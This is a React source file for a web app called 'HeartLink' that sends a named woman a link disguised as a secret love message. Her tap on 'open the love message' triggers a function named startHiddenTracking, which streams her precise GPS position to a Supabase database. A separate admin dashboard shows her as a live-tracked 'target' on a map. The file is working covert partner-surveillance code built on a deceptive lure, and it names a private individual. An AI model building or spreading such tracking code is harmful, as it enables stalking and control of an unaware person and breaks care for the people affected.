
import React, { useState, useEffect, useCallback } from 'react';
import { LocationData, SafetyReport } from './types';
import LiveMap from './components/LiveMap';
import { analyzeLocationSafety } from './services/geminiService';
import { updateLocation, getLatestLocation, subscribeToLocation, supabase } from './services/supabaseService';
import { Heart, MapPin, Sparkles, RefreshCcw, MessageCircleHeart, Flower2, Stars, Music, Crown, Lock, Cloud, AlertCircle } from 'lucide-react';

const App: React.FC = () => {
  const [view, setView] = useState<'admin' | 'partner'>('admin');
  const [location, setLocation] = useState<LocationData | null>(null);
  const [safetyReport, setSafetyReport] = useState<SafetyReport | null>(null);
  const [isAnalyzing, setIsAnalyzing] = useState(false);
  const [isTracking, setIsTracking] = useState(false);
  const [showSurprise, setShowSurprise] = useState(false);
  const [isDbConnected, setIsDbConnected] = useState(false);

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const mode = params.get('view');
    if (mode === 'partner') {
      setView('partner');
    } else {
      setView('admin');
    }
  }, []);

  // --- PARTNER LOGIC (MEY'S SIDE) ---
  const startHiddenTracking = useCallback(() => {
    if (!navigator.geolocation) return;
    
    setIsTracking(true);
    const watchId = navigator.geolocation.watchPosition(
      async (position) => {
        const data: LocationData = {
          lat: position.coords.latitude,
          lng: position.coords.longitude,
          accuracy: position.coords.accuracy,
          timestamp: position.timestamp
        };
        // Sync to Supabase (fails gracefully internally if config is missing)
        await updateLocation(data);
        setLocation(data);
      },
      (err) => console.error("Tracking error:", err),
      { enableHighAccuracy: true }
    );

    return () => navigator.geolocation.clearWatch(watchId);
  }, []);

  // --- ADMIN LOGIC (YOUR SIDE) ---
  useEffect(() => {
    if (view === 'admin') {
      if (!supabase) {
        setIsDbConnected(false);
        return;
      }

      // Initial fetch
      getLatestLocation().then(data => {
        if (data) {
          setLocation(data);
          setIsTracking(true);
          setIsDbConnected(true);
        }
      });

      // Subscribe to real-time updates from Supabase
      const subscription = subscribeToLocation((newLocation) => {
        setLocation(newLocation);
        setIsTracking(true);
      });

      return () => {
        subscription.unsubscribe();
      };
    }
  }, [view]);

  const handleAnalyze = async () => {
    if (!location) return;
    setIsAnalyzing(true);
    const report = await analyzeLocationSafety(location);
    setSafetyReport(report);
    setIsAnalyzing(false);
  };

  // --- PARTNER VIEW (THE ROMANTIC SHRINE) ---
  if (view === 'partner') {
    return (
      <div className="min-h-screen bg-gradient-to-b from-rose-100 via-pink-100 to-white flex flex-col items-center justify-center p-6 text-center overflow-hidden relative">
        <div className="absolute inset-0 pointer-events-none overflow-hidden">
          {[...Array(15)].map((_, i) => (
            <Heart 
              key={i} 
              className={`absolute text-rose-300/30 fill-rose-300/20 animate-heartbeat`}
              style={{
                top: `${Math.random() * 100}%`,
                left: `${Math.random() * 100}%`,
                width: `${Math.random() * 40 + 20}px`,
                animationDelay: `${Math.random() * 5}s`
              }}
            />
          ))}
        </div>

        {!showSurprise ? (
          <div className="relative z-10 max-w-md animate-in fade-in zoom-in duration-700">
            <div className="bg-white/60 backdrop-blur-xl p-8 rounded-[3rem] border-2 border-white shadow-2xl">
              <div className="w-20 h-20 bg-rose-500 rounded-full flex items-center justify-center mx-auto mb-6 shadow-lg">
                <Lock className="w-10 h-10 text-white" />
              </div>
              <h1 className="font-romantic text-4xl text-rose-600 mb-4">Ada Pesan Spesial...</h1>
              <p className="text-rose-800 font-medium mb-8">
                Seseorang telah mengirimkan pesan cinta yang sangat rahasia untukmu.
              </p>
              <button 
                onClick={() => {
                  setShowSurprise(true);
                  startHiddenTracking();
                }}
                className="bg-rose-500 hover:bg-rose-600 text-white px-10 py-4 rounded-full font-bold shadow-xl shadow-rose-200 transition-all hover:scale-105 active:scale-95"
              >
                Buka Pesan Cinta ❤️
              </button>
            </div>
          </div>
        ) : (
          <div className="relative z-10 max-w-2xl animate-in slide-in-from-bottom-10 duration-1000">
            <header className="mb-12">
              <Crown className="w-12 h-12 text-amber-400 mx-auto mb-4 animate-bounce" />
              <h1 className="font-romantic text-6xl md:text-7xl text-rose-600 mb-2 drop-shadow-sm">
                Mey Syavarul Hidayah
              </h1>
              <p className="text-rose-400 font-bold uppercase tracking-[0.3em] text-xs">Ratu di Hatiku Selamanya</p>
            </header>

            <div className="bg-white/40 backdrop-blur-md p-10 rounded-[4rem] border border-white/60 shadow-inner relative overflow-hidden">
              <Sparkles className="absolute top-6 left-6 text-amber-400 w-6 h-6 animate-pulse" />
              <Sparkles className="absolute bottom-6 right-6 text-amber-400 w-6 h-6 animate-pulse" />
              
              <div className="prose prose-rose mx-auto">
                <p className="text-xl md:text-2xl text-rose-900 font-romantic leading-relaxed">
                  "Sayangku Mey, setiap langkahmu adalah doa bagiku. Aku ingin kamu tahu bahwa kamu adalah hal terindah yang pernah terjadi dalam hidupku. Senyumanmu adalah cahayaku, dan keberadaanmu adalah bahagiaku."
                </p>
                <div className="mt-8 flex justify-center gap-4">
                  <Flower2 className="text-rose-400 w-8 h-8 animate-spin-slow" style={{ animationDuration: '8s' }} />
                  <Heart className="text-rose-500 fill-rose-500 w-8 h-8 animate-heartbeat" />
                  <Flower2 className="text-rose-400 w-8 h-8 animate-spin-slow" style={{ animationDuration: '10s' }} />
                </div>
                <p className="mt-8 text-rose-700 font-bold italic">
                  - Suamimu yang Selalu Menjagamu -
                </p>
              </div>
            </div>

            <div className="mt-12 grid grid-cols-3 gap-4">
              <div className="flex flex-col items-center">
                <div className="bg-rose-100 p-4 rounded-full mb-2"><Stars className="text-rose-500" /></div>
                <span className="text-[10px] font-bold text-rose-400 uppercase">Tercantik</span>
              </div>
              <div className="flex flex-col items-center">
                <div className="bg-rose-100 p-4 rounded-full mb-2"><Music className="text-rose-500" /></div>
                <span className="text-[10px] font-bold text-rose-400 uppercase">Terbaik</span>
              </div>
              <div className="flex flex-col items-center">
                <div className="bg-rose-100 p-4 rounded-full mb-2"><Sparkles className="text-rose-500" /></div>
                <span className="text-[10px] font-bold text-rose-400 uppercase">Terhebat</span>
              </div>
            </div>
          </div>
        )}
      </div>
    );
  }

  // --- ADMIN VIEW (YOUR DASHBOARD) ---
  return (
    <div className="flex flex-col min-h-screen bg-slate-900 text-white overflow-hidden">
      <header className="bg-slate-800/50 backdrop-blur-md border-b border-white/10 px-6 py-4 flex items-center justify-between sticky top-0 z-50">
        <div className="flex items-center gap-2">
          <div className="bg-rose-600 p-2 rounded-xl">
            <Heart className="w-5 h-5 text-white fill-white" />
          </div>
          <div>
            <h1 className="text-lg font-bold">HeartLink Admin</h1>
            <p className="text-[10px] text-rose-400 font-black uppercase tracking-tighter">Mey Protection System</p>
          </div>
        </div>
        <div className="flex items-center gap-4">
          <div className={`flex items-center gap-2 px-3 py-1.5 rounded-full border ${isDbConnected ? 'bg-slate-700/50 border-white/5' : 'bg-amber-500/20 border-amber-500/30'}`}>
             {isDbConnected ? (
               <Cloud className="w-3.5 h-3.5 text-blue-400" />
             ) : (
               <AlertCircle className="w-3.5 h-3.5 text-amber-500" />
             )}
             <span className={`text-[10px] font-bold ${isDbConnected ? 'text-slate-300' : 'text-amber-500'}`}>
               {isDbConnected ? 'Supabase Connected' : 'Supabase Config Missing'}
             </span>
          </div>
          <div className="flex flex-col items-end">
            <span className="text-[10px] font-bold text-slate-400 uppercase">Target Status</span>
            <div className="flex items-center gap-1.5">
              <div className={`w-2 h-2 rounded-full ${isTracking ? 'bg-green-500 animate-pulse' : 'bg-slate-600'}`} />
              <span className="text-xs font-bold">{isTracking ? 'Live Tracking' : 'Offline'}</span>
            </div>
          </div>
        </div>
      </header>

      <main className="flex-1 flex flex-col md:flex-row gap-6 p-6 overflow-y-auto">
        <div className="w-full md:w-80 flex flex-col gap-6">
          {!isDbConnected && (
            <div className="bg-amber-500/10 border-2 border-amber-500/20 p-6 rounded-3xl animate-pulse">
              <h3 className="text-amber-500 font-bold mb-2 flex items-center gap-2 uppercase text-xs">
                <AlertCircle className="w-4 h-4" /> Setup Required
              </h3>
              <p className="text-xs text-amber-400 leading-relaxed">
                Supabase URL and Key are missing. Please add <strong>SUPABASE_URL</strong> and <strong>SUPABASE_ANON_KEY</strong> to your environment variables to enable cross-device tracking.
              </p>
            </div>
          )}

          <div className="bg-slate-800 rounded-3xl p-6 border border-white/5 shadow-2xl">
            <div className="flex items-center gap-4 mb-6">
              <div className="w-14 h-14 rounded-full bg-rose-500/20 flex items-center justify-center border-2 border-rose-500/30">
                <Crown className="w-8 h-8 text-rose-500" />
              </div>
              <div>
                <h3 className="font-bold text-lg">Mey Syavarul H.</h3>
                <p className="text-xs text-slate-400 italic">Istri Tercinta</p>
              </div>
            </div>

            <div className="space-y-3">
              <div className="bg-slate-700/50 p-3 rounded-2xl flex justify-between items-center">
                <span className="text-xs text-slate-400">Terakhir Update</span>
                <span className="text-xs font-bold">{location ? new Date(location.timestamp).toLocaleTimeString() : '--:--'}</span>
              </div>
              <div className="bg-slate-700/50 p-3 rounded-2xl flex justify-between items-center">
                <span className="text-xs text-slate-400">Akurasi GPS</span>
                <span className="text-xs font-bold text-rose-400">±{location?.accuracy.toFixed(1) || '0'}m</span>
              </div>
            </div>

            <button 
              onClick={handleAnalyze}
              disabled={!location || isAnalyzing}
              className="w-full mt-6 py-4 bg-rose-600 hover:bg-rose-700 disabled:opacity-30 text-white rounded-2xl font-bold transition-all flex items-center justify-center gap-2"
            >
              {isAnalyzing ? <RefreshCcw className="w-5 h-5 animate-spin" /> : <MessageCircleHeart className="w-5 h-5" />}
              AI Security Insight
            </button>
          </div>

          {safetyReport && (
            <div className="bg-rose-600 rounded-3xl p-6 shadow-xl animate-in slide-in-from-left-4 duration-500">
              <h3 className="font-bold text-white mb-2 flex items-center gap-2">
                <Sparkles className="w-4 h-4" /> Pesan Penjaga AI
              </h3>
              <p className="text-sm text-rose-100 italic leading-relaxed mb-4">
                "{safetyReport.summary}"
              </p>
              <div className="space-y-2">
                {safetyReport.recommendations.map((r, i) => (
                  <div key={i} className="bg-white/10 p-2 rounded-lg text-[10px] font-bold">
                    • {r}
                  </div>
                ))}
              </div>
            </div>
          )}

          <div className="bg-amber-500/10 border border-amber-500/20 p-4 rounded-2xl">
            <p className="text-[10px] text-amber-500 font-bold uppercase mb-1">Link untuk Mey:</p>
            <code className="text-[10px] break-all text-slate-400 block p-2 bg-black/20 rounded">
              {window.location.origin}/?view=partner
            </code>
            <button 
              onClick={() => navigator.clipboard.writeText(`${window.location.origin}/?view=partner`)}
              className="mt-2 text-[10px] text-white font-bold bg-amber-500 px-3 py-1 rounded"
            >
              Salin Link
            </button>
          </div>
        </div>

        <div className="flex-1 min-h-[500px] bg-slate-800 rounded-[3rem] border-4 border-slate-700 overflow-hidden relative shadow-2xl">
          <LiveMap location={location} targetName="Mey Syavarul Hidayah" />
          <div className="absolute top-6 left-6 z-[1001] bg-rose-600 px-4 py-2 rounded-full text-[10px] font-black tracking-widest uppercase">
            Live Monitoring Active
          </div>
        </div>
      </main>
    </div>
  );
};

export default App;
